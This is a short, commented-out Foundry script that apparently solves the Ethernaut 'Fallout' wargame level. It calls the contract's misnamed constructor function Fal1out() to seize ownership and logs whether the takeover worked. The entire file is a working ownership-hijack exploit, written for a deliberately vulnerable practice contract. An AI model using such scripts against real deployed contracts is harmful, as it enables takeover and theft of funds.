// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.6.0;

// import {Script, console} from "forge-std/Script.sol";
// import {Fallout} from "../src/fallout.sol";

// contract falloutHack is Script {
//     Fallout public fallout =
//         Fallout(payable(0x6254d1F92816ba6DcaAC1783BC882f2430F06B5b));

//     function run() public {
//         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

//         console.log("Owner before", fallout.owner());
//         fallout.Fal1out();
//         console.log("Owner after", fallout.owner());

//         if (fallout.owner() == payable(vm.envUint("MY_ADDRESS"))) {
//             console.log("Hack Positive");
//         } else {
//             console.log("Hack Negative");
//         }

//         vm.stopBroadcast();
//     }
// }

// // forge script script/fallout.s.sol -vv
// // forge script script/fallout.s.sol -vv --broadcast
